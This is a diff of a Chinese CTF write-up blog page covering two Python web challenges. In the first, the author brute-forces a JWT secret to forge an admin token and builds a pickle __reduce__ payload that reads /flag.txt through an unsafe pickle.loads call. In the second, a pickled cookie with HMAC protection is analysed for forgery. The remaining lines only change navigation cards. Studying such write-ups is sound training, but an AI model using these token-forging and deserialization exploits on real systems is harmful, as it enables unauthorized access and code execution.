+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlYxY3VuYSJ9.XkNYqo8PmtSXIH_24l03JPXv2wyidHfob_mUUPL-1UQ;</code></pre><p><img src="https://i.loli.net/2020/05/29/8hpsXDjLAVFgnrP.png" alt="Snipaste_2020-05-29_13-44-43.png"></p>
+<p>解密得到上图</p>
+<p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-crack</a>爆破一下密钥得<code>Secret is "1Kun"</code>，所以我们就可以伪造admin了</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></pre><p>重发一下，F12，找到了<code>www.zip</code>下载下来发现是源码。</p>
+<p>审计Admin.py</p>
+<pre><code class="python">import tornado.web
+from sshop.base import BaseHandler
+import pickle
+import urllib
+
+
+class AdminHandler(BaseHandler):
+    @tornado.web.authenticated
+    def get(self, *args, **kwargs):
+        if self.current_user == "admin":
+            return self.render('form.html', res='This is Black Technology!', member=0)
+        else:
+            return self.render('no_ass.html')
+
+    @tornado.web.authenticated
+    def post(self, *args, **kwargs):
+        try:
+            become = self.get_argument('become')
+            p = pickle.loads(urllib.unquote(become))
+            return self.render('form.html', res=p, member=1)
+        except:
+            return self.render('form.html', res='This is Black Technology!', member=0)
+</code></pre>
+<p>我们注意到调用了pickle库，并且调用了<code>pickle.loads()</code>函数，而最后的<code>become</code>参数可控</p>
+<p>EXP：</p>
+<pre><code class="python">#python3.6.8
+import pickle
+import urllib.parse
+
+class payload(object):
+    def __reduce__(self):
+       return (eval, ("open('/flag.txt','r').read()",))
+
+a = pickle.dumps(payload())
+s = urllib.parse.quote(a)
+print (s)</code></pre>
+<h2 id="PickleStore"><a href="#PickleStore" class="headerlink" title="PickleStore"></a>PickleStore</h2><p><strong>难度：中等</strong></p>
+<p><strong>知识点：Pickle反序列化，cookie伪造，hmac验证</strong></p>
+<p>看到pickle想到pickle反序列化，我们知道一般pickle序列化会出现在一些数据库和session储存过程中，这里没有任何数据库的信息。</p>
+<p>和上一题差不多的思路，买一个，看一下cookie。（因为pickle反序列化一个利用是执行命令，另一个就是变量覆盖）</p>
+<p>执行命令比较简单，就是反弹到内网靶机。</p>
+<p>想试一下变量覆盖。</p>
+<pre><code>gAN9cQAoWAUAAABtb25leXEBTeoBWAcAAABoaXN0b3J5cQJdcQNYFQAAAFl1bW15IHN0YW5kYXJkIHBpY2tsZXEEYVgQAAAAYW50aV90YW1wZXJfaG1hY3EFWCAAAAAzNWUyYWM5ZmNlNDMzMTQ2MjAyZTlhMDNiMzE5N2Y3YXEGdS4=</code></pre><p>直接base解不出来，python先转base再转pickle得到：</p>
+<pre><code class="python">{'money': 490, 'history': ['Yummy standard pickle'], 'anti_tamper_hmac': '35e2ac9fce433146202e9a03b3197f7a'}</code></pre>
+<p>这里发现有hmac验证，写个示例代码</p>
+<pre><code class="python">import hmac
+message = b'Hello, world!'
+key = b'secret'
+h = hmac.new(key, message, digestmod='MD5')
+# 如果消息很长，可以多次调用h.update(msg)
+h.hexdigest()
+&gt;&gt;  'fa4ee7d173f2d97ee79022d1a7355bcf'</code></pre>
+<p>如果要覆盖，覆盖什么呢？当然是有用的但是现在未知的，对，就是这个key，有了它，我们就能进行伪造。具体可以看</p>
+<p><a href="https://xz.aliyun.com/t/7320" target="_blank" rel="noopener">https://xz.aliyun.com/t/7320</a></p>
+<p><strong>但是其实的确是讨巧的，因为这里需要key所代表的变量名，结果恰好就是默认的key，如果换个<code>s3cret_k3y</code>变量就不能成功了。正经方法还是上马</strong></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -743,37 +1191,43 @@ echo serialize($a);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/1527.html">
+                <a href="/posts/ab7.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/17.jpg" class="responsive-img" alt="Mysql注入">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="BUU-web分类整理">
                         
-                        <span class="card-title">Mysql注入</span>
+                        <span class="card-title">BUU-web分类整理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Mysql注入进阶Written by ttpfx
-Added by M0nkey、V1cuna
-1.常见过滤手段的Bypass
+                            BUU-web分类整理[BJDCTF 2nd]假猪套天下第一难度：易
+考点：Header请求头
 
-and/or的过滤/拦截
-空格被过滤/拦截
-括号被过滤/拦截
-逗号被过滤/拦截
-information_sc
+
+
+Header
+解释
+示例
+
+
+
+Accept
+指定客户端能够接收的内容类型
+Accept: text/plain, text/html,a
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -782,15 +1236,20 @@ information_sc
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL-injection/">
-                        <span class="chip bg-color">SQL injection</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
-                    <a href="/tags/Summary/">
-                        <span class="chip bg-color">Summary</span>
+                    <a href="/tags/WP/">
+                        <span class="chip bg-color">WP</span>
+                    </a>
+                    
+                    <a href="/tags/BUU/">
+                        <span class="chip bg-color">BUU</span>
                     </a>
                     
                 </div>
@@ -804,24 +1263,25 @@ information_sc
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/c1a1.html">
+                <a href="/posts/271d.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/23.jpg" class="responsive-img" alt="学习python反序列化">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="Laravel 5.8.x 漏洞分析">
                         
-                        <span class="card-title">学习python反序列化</span>
+                        <span class="card-title">Laravel 5.8.x 漏洞分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0X01:Pickle是干什么用的：序列化、反序列化　　在很多任务中，我们可能会需要把一些内容存储起来，以备后续利用。如果我们要存储的内容只是一条字符串或是数字，那么我们只需要把它写进文件就行。然而，如果我们需要存储的东西是一个dict、一
+                            Laravel 5.8.x 漏洞分析据中哥说①环境出了点问题②有五条链子，但是我今天自己只跟出来三条（一条好像被修了）。。。wtcl，没分析出来的我把连接放上。
+搭建环境composer create-project --prefer-di
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-02
                             </span>
                         <span class="publish-author">
                             
@@ -830,14 +1290,6 @@ information_sc
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%80%BB%E7%BB%93/">
-                        <span class="chip bg-color">-python反序列化 -总结</span>
-                    </a>
-                    
                 </div>
                 
             </div>
